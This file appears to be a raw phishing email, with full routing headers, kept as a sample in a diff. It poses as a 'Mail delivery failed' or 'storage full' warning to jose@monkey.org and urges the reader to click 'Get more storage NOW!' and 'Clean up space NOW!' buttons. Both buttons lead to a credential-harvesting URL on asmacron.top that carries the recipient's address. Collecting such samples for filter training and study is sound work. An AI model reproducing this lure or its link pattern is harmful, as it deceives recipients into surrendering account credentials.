@@ -1,0 +1,218 @@
+Return-Path: anya@johnslavin.com
+Delivered-To: jose@monkey.org
+X-FDA: 82668469548.30.3D64E45
+Received: from sleek.johnslavin.com (sleek.johnslavin.com [193.25.216.189])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 9053B1A0005
+	for <jose@monkey.org>; Sun, 13 Oct 2024 12:13:31 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;	dkim=pass
+ header.d=johnslavin.com header.s=dkim header.b=xVH23cGt;	spf=pass
+ (imf02.b.hostedemail.com: domain of anya@johnslavin.com designates
+ 193.25.216.189 as permitted sender) smtp.mailfrom=anya@johnslavin.com;
+	dmarc=pass (policy=none) header.from=johnslavin.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1728821525;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=MHzRVMpq5LOqDhx5Uccs0eew0WNjLhfHoH5+twzT8jg=;
+	b=HVTrNgh08I0WKtBWV5FfSTG9hF2Y5Slg5S5YfbfIccfAJlWl5ROEabP9wczbxILhOykzX/
+	hAXNPHl0ul0G1jswZQfu6j4JuaivAUdMjynA1RhNlWYun0FUXdoiqUV1BJbbWSjvF3IM48
+	TAAa5Ogw8ebYO2mCTmWb3481cFyNwXA=
+ARC-Authentication-Results: i=1;	imf02.b.hostedemail.com;	dkim=pass
+ header.d=johnslavin.com header.s=dkim header.b=xVH23cGt;	spf=pass
+ (imf02.b.hostedemail.com: domain of anya@johnslavin.com designates
+ 193.25.216.189 as permitted sender) smtp.mailfrom=anya@johnslavin.com;
+	dmarc=pass (policy=none) header.from=johnslavin.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1728821525; a=rsa-sha256;
+	cv=none;
+	b=SECopN39gQjgHNscKNV7IlwEZhJ6ryfARfaMxkGqVDFp8L6VEkfm/oEHUkZR37S5dITci0
+	2vdVhYq6KGo7/F6J/4bozptpU22ILvRFpIAtUz5nBPFsjxjW+FEKCPn5oDr+n3zoA7kVzU
+	n+umMXActC0kxHi46G8Tu2blDkKbMEA=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=johnslavin.com; 
+ =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMIME-Version=3ACont?=
+ =?utf-8?q?ent-Type=3AContent-Transfer-Encoding=3B?= i=anya@johnslavin.com;
+ bh=LuDAX2XjcwMwj9oXdbEJk+/yUbk=; =?utf-8?q?b=3DxVH23cGtmqQdandg6/32/3wkOb52?=
+ =?utf-8?q?xU+YsOHr2CVkezT2+TZSD20xbBwAS11LrwW4muFD7uJjXvz0?=  
+ WUW9Jj7X9mU4X9UvHm53JVauHw5HozNbrmveJNXE01Swe7DnVcXSMjRKgVnnz9R9g6PCTOgstvPS
+  
+ 5bRgOGE9w2qeMyAL5oaDpUpnuDXppAQ8o8U2jSLL1TvdlVNhRo+I4s9lYRSDR0Pob+tRBEd/vdw+
+  
+ MbIPePIs6ZOvzsp2LcFbOySmRS2EGP1vdFlnlxpWgausSHv9GWGBS/qp2+JcvPryTPxcMo7c5tFr
+   C5slbCOE/glPBiqFNLhLZZxHgRL8z0e5kc3xdw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=johnslavin.com; 
+ =?utf-8?q?b=3DPMaMo/HdSHqjS5bGqY7ClJyyJGyELiI5qPG+4NQ/nh7/mWea1aj2xr9O3ybUf?=
+ =?utf-8?q?Yy6e0ep3YohDBuS?=  
+ S4o3gHmev6X9ZFBkk5wKqbmJPadCbtbEleW2uc464Fosb1zf2HQ30ZeXdEevJXtPqxWsYbjImPSI
+  
+ xdNc1lsdrRzi8citZHKRZtfmOMIkxFCY9ShsTwoQyApaLrSmzh39ZWuWhWPhMRB4vDPE/eB9gs2E
+  
+ qScsBx65FMInVIaCUyB6rm7trpbkFjzmdUHL3XI1LgTarkiTBl2mB7/5Oz2BfHNaxNDQCYyqI1Ls
+   VQjL+hjw8tnE+Ng1VNfAzJ7vvOVRnHRizVecIQ==;
+From: Mail Delivery Message <anya@johnslavin.com>
+To: jose@monkey.org
+Subject: Mail delivery failed: returning message to sender
+Date: 11 Oct 2024 06:14:40 -0700
+Message-ID: <20241011061440.721861A9605A3599@johnslavin.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: Yes, score=9.70
+X-Stat-Signature: 39e1t9rufxqah5kcor1sjy6epaj1kzw1
+X-Rspamd-Server: rspam12
+X-Rspamd-Queue-Id: 9053B1A0005
+X-Rspam-User: 
+X-HE-Tag: 1728821611-808936
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/+fjzS7ONR6U6d+4OKMz4knFoUsQcs2dzLf1mRuZO77KW?=
+ =?utf-8?q?QeJb4l09Dlj1JdahhNI8KNz69mSN0b0r1b9X7QGple6TbjsoOWS/iPSkuyxbuBAun?=
+ =?utf-8?q?6W8wCyInUbgISrGYaf4WqjZJNp8UVOZa6HoiTv4mqHD8HqZZLgTzzs63H7syeZmRU?=
+ =?utf-8?q?w4Zw3cqdKoYcUXmVuvo9aMvvuCpfioQJrqR5LalH6qujbHXnkb9UwRUCR0A3n3gKw?=
+ =?utf-8?q?SYOccw9xhv9av2wHQfLxvfIpuZDNh7OI+4UY+GCyokRB18lKWxK2wK6ctEodC82db?=
+ =?utf-8?q?ZCoIAwW3VHlv94bHjGDUK3eO4WvJ7/thGzobau6DgBEEPgSYDVVJqfVtg9twbiNqq?=
+ =?utf-8?q?2+wZm4t+sVTU5zJl2Xth2A4hlBfJgzVzPzrKSPAC2v6MQyI+WObcOud+m9+ECSP0s?=
+ =?utf-8?q?lH+znaKlJWurMOKMR8IPrCxEVSdlb/Ex9LfaWoPZVHKIZ25MGec3GLVWfBCVA4d4R?=
+ =?utf-8?q?OjypryjkH+OQtHrTkuJ/+Qw5D9u863m5HXsUl2L62RnxQ6FCfoIMdvhUBuIkp8F+s?=
+ =?utf-8?q?/TBx1jSlGje5PQH7Uy/DwXMaFoZyGIxQ4bOQE844X0BuVSrc5UA/hLFa6C3QqCxuD?=
+ =?utf-8?q?C/PvUIAtZHAcNhE0hCN0ohtVJjG0sF6ltg7ZwuiPKVKzsBvvUXLhMXqjoaSHE0NbM?=
+ =?utf-8?q?YWbnPTflRpe7I4VxNV4pflkYbem8OPURSIq70859rLBhgAm78875L/ER0sOEjMaOt?=
+ =?utf-8?q?jkHZtUbbCSr5SQn1USz+YvizDRy/9MKunoSWVW3sg21+d9JuRTVbIp5PA8V4V4q7/?=
+ =?utf-8?q?dyEhxNuoHBBoLwW6kNQy+PJOXBfvMh2/NXV1WhkVse0JesWVJgNYS2My0AhdAgcen?=
+ =?utf-8?q?ruhVv55dKcaKnHtIRoJRoP0rgBqO3Ib/3nIv5W/MtoybkugVDPcrAv05/ASBG9slp?=
+ =?utf-8?q?6ulewB19qKvydSO+vTN1rz_vjWMQy3PL9y0BdQuaWlwqhixUY2jNBjms897MhCxNL?=
+ =?utf-8?q?TtWkKMAMCLX4lsfJNQmiDiS/Aiw7UHGTIt6RCHay6oEQ+fLB8cWtcDIgzENLwts2k?=
+ =?utf-8?q?LgcAZqe6A5ZHKegqzwESbts2Ume2GaMGYcYRhtaYH+PzMosARr+TgL0OdeoAU2UIM?=
+ =?utf-8?q?FNprX7jZSAsuKxhGHoFycAQx8sbE/xY8fTGmba1opqFy1+rlz1ikwBO9ylbNVHYoN?=
+ =?utf-8?q?lpxdBn2l6KdTS6pfvN2hbmcnT+AW1KCsqBgWvdki85kstQ=3D=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 309
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><p align=3D"center">
+<br></p><div align=3D"center">
+</div><div align=3D"center">
+</div><p align=3D"center"><br></p>
+<div align=3D"center" style=3D"padding: 0px; color: rgb(68, 68, 68); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: aria=
+l, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-=
+spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
+ws: 2; background-color: rgba(241, 243, 244, 0.5); font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><div style=3D"box-sizing: border-=
+box;"><h2 style=3D"margin: 0px; padding: 0px; color: rgb(50, 50, 50); line-=
+height: 22px; font-family: Helvetica, Arial, sans-serif; font-size: 14px; f=
+ont-weight: 700; box-sizing: border-box;"><font size=3D"5" style=3D"box-siz=
+ing: border-box;"><font size=3D"2" style=3D"box-sizing: border-box;">Dear&n=
+bsp;jose</font></font></h2>
+<div style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-s=
+erif; font-size: small; box-sizing: border-box;"><span style=3D"color: rgb(=
+0, 0, 0); font-family: arial, helvetica, sans-serif; box-sizing: border-box=
+;"><span style=3D"font-weight: bolder; box-sizing: border-box;"><br style=
+=3D"box-sizing: border-box;"></span></span></div><div style=3D"color: rgb(3=
+4, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small; bo=
+x-sizing: border-box;">
+<span style=3D"color: rgb(0, 0, 0); font-family: arial, helvetica, sans-ser=
+if; box-sizing: border-box;"><span style=3D"font-weight: bolder; box-sizing=
+: border-box;">Your Email can't send and receive emails</span></span></div>=
+<div style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-s=
+erif; font-size: small; box-sizing: border-box;"><span style=3D"color: rgb(=
+0, 0, 0); font-family: arial, helvetica, sans-serif; box-sizing: border-box=
+;"><br style=3D"box-sizing: border-box;"></span></div>
+<div style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-s=
+erif; font-size: small; box-sizing: border-box;"><span style=3D"color: rgb(=
+0, 0, 0); font-family: arial, helvetica, sans-serif; box-sizing: border-box=
+;"><span style=3D"font-weight: bolder; box-sizing: border-box;">Your storag=
+e is full. Email sent to you will be bounced back to the sender and can't b=
+e recovered later. </span></span></div></div></div>
+<div align=3D"center" style=3D"padding: 0px; color: rgb(0, 0, 0); text-tran=
+sform: none; text-indent: 0px; letter-spacing: normal; font-family: verdana=
+, helvetica, sans-serif; font-size: 13px; font-style: normal; font-weight: =
+400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
+s: 2; widows: 2; background-color: rgba(241, 243, 244, 0.5); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><div style=
+=3D"line-height: 15px; box-sizing: border-box;" dir=3D"ltr"><span style=3D"=
+font-size: small; box-sizing: border-box;"><div style=3D"font-weight: bold;=
+ box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></div><div =
+style=3D"font-weight: bold; box-sizing: border-box;"><span style=3D"font-we=
+ight: bolder; box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
+"></span>
+<a style=3D"background: rgb(68, 108, 179); margin: 0px; padding: 10px; bord=
+er-radius: 30px; color: white; font-size: 11px; text-decoration: none; box-=
+sizing: border-box;"=20
+href=3D"https://asmacron.top/machlido/verifying_email/bapi/composite/v1/pri=
+vate/message/view_bEt=3DeyJhbGciOiJIUzI1NiJ9.eyJjdCI6ImEiLCJiIjoiMTAwNDU1MD=
+AyOCIsInIiOiJodHRwczovL2FwcC5iaW5hbmNlLmNvbS9lbi9teS9zZXR0aW5ncy9wcm9maWxlP=
+19kcD1MM2RsWW5acFpYY3ZkMlZpZG1sbGR6OTBlWEJsUFdSb/FptRjFiSFFtYm1WbFpFeHZaMmx=
+1UFdaaGJITmxKblZ5YkQxaFNGSXdZMGhOTmt4NU9UTmtNMk4xV1cxc2RWbFhOV3BhVXpWcVlqSX=
+dkbHBYTkhaaVdHdDJZekpXTUdSSGJIVmABC/index.html#jose@monkey.org" target=3D"_=
+blank" rel=3D"noreferrer">
+CLICK TO &nbsp;Get more storage&nbsp;NOW!</a><span style=3D"font-weight: bo=
+lder; box-sizing: border-box;">&nbsp;</span></div><div style=3D"font-weight=
+: bold; box-sizing: border-box;"><span style=3D"font-weight: bolder; box-si=
+zing: border-box;"><br style=3D"box-sizing: border-box;"></span></div><div =
+style=3D"font-weight: bold; box-sizing: border-box;"><br style=3D"box-sizin=
+g: border-box;"></div><div style=3D"font-weight: bold; box-sizing: border-b=
+ox;"><br style=3D"box-sizing: border-box;"></div>
+<div style=3D"box-sizing: border-box;"><span style=3D"font-weight: bolder; =
+box-sizing: border-box;"><span style=3D'color: rgb(95, 99, 104); font-famil=
+y: "google sans", roboto, arial, helvetica, sans-serif; font-size: 16px; bo=
+x-sizing: border-box;'>more storage or clean up space to immediately resume=
+&nbsp;</span><span>&nbsp;</span><span style=3D'color: rgb(95, 99, 104); fon=
+t-family: "google sans", roboto, arial, helvetica, sans-serif; font-size: 1=
+6px; box-sizing: border-box;'>getting emails.</span>
+<br style=3D"box-sizing: border-box;"></span></div><div style=3D"box-sizing=
+: border-box;"><div align=3D"center" style=3D"padding: 0px; color: rgb(68, =
+68, 68); font-family: arial, sans-serif; font-size: 14px; box-sizing: borde=
+r-box;"><div style=3D"box-sizing: border-box;"><br style=3D"box-sizing: bor=
+der-box;"></div></div><div align=3D"center" style=3D"padding: 0px; font-siz=
+e: 13px; box-sizing: border-box;"><div style=3D"line-height: 15px; box-sizi=
+ng: border-box;" dir=3D"ltr">
+<span style=3D"font-size: small; font-weight: bolder; box-sizing: border-bo=
+x;"><div style=3D"box-sizing: border-box;"><span style=3D"font-weight: bold=
+er; box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span>
+<a style=3D"background: rgb(68, 108, 179); margin: 0px; padding: 10px; bord=
+er-radius: 30px; color: white; font-size: 11px; text-decoration: none; box-=
+sizing: border-box;"=20
+href=3D"https://asmacron.top/machlido/verifying_email/bapi/composite/v1/pri=
+vate/message/view_bEt=3DeyJhbGciOiJIUzI1NiJ9.eyJjdCI6ImEiLCJiIjoiMTAwNDU1MD=
+AyOCIsInIiOiJodHRwczovL2FwcC5iaW5hbmNlLmNvbS9lbi9teS9zZXR0aW5ncy9wcm9maWxlP=
+19kcD1MM2RsWW5acFpYY3ZkMlZpZG1sbGR6OTBlWEJsUFdSb/FptRjFiSFFtYm1WbFpFeHZaMmx=
+1UFdaaGJITmxKblZ5YkQxaFNGSXdZMGhOTmt4NU9UTmtNMk4xV1cxc2RWbFhOV3BhVXpWcVlqSX=
+dkbHBYTkhaaVdHdDJZekpXTUdSSGJIVmABC/index.html#jose@monkey.org" target=3D"_=
+blank" rel=3D"noreferrer">CLICK TO Clean up space NOW!</a>
+<span style=3D"font-weight: bolder; box-sizing: border-box;">&nbsp;<br styl=
+e=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span>=
+</div><div style=3D"box-sizing: border-box;"><p style=3D"font-family: arial=
+, sans-serif; font-size: 12px; font-weight: 400; margin-top: 0px; margin-bo=
+ttom: 1rem; box-sizing: border-box;" dir=3D"ltr"><span style=3D"font-size: =
+small; box-sizing: border-box;"><font size=3D"3" style=3D"box-sizing: borde=
+r-box;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</font></span></p>
+<font size=3D"3" style=3D"box-sizing: border-box;"><hr width=3D"700" align=
+=3D"left" style=3D"border-width: 1px 0px 0px; border-style: solid none none=
+; border-color: rgba(0, 0, 0, 0.1) currentColor currentColor; height: 0px; =
+overflow: visible; font-family: arial, sans-serif; font-size: 12px; font-we=
+ight: 400; margin-top: 1rem; margin-bottom: 1rem; box-sizing: content-box;"=
+></font><div style=3D"font-family: arial, sans-serif; font-weight: 400; box=
+-sizing: border-box;">
+<div style=3D"color: rgb(68, 68, 68); line-height: 21px; font-family: calib=
+ri, sans-serif; font-size: 15px; box-sizing: border-box;"><br style=3D"box-=
+sizing: border-box;"></div></div><div style=3D"font-family: arial, sans-ser=
+if; font-weight: 400; box-sizing: border-box;"><span style=3D"line-height: =
+21px; font-weight: bolder; box-sizing: border-box;"><font size=3D"2" style=
+=3D"color: rgb(117, 123, 128); line-height: normal; font-family: verdana, g=
+eneva, sans-serif; box-sizing: border-box;">
+<span style=3D"line-height: 22px; box-sizing: border-box;"><span style=3D'c=
+olor: rgb(0, 0, 0); font-family: "times new roman", serif; font-size: 16px;=
+ font-weight: bolder; box-sizing: border-box;'>Copyright&nbsp;&copy;&nbsp;2=
+024</span></span></font></span></div></div></span></div></div></div></span>=
+</div></div><p align=3D"center"><br></p><p align=3D"center"><br></p></body>=
+</html>
+
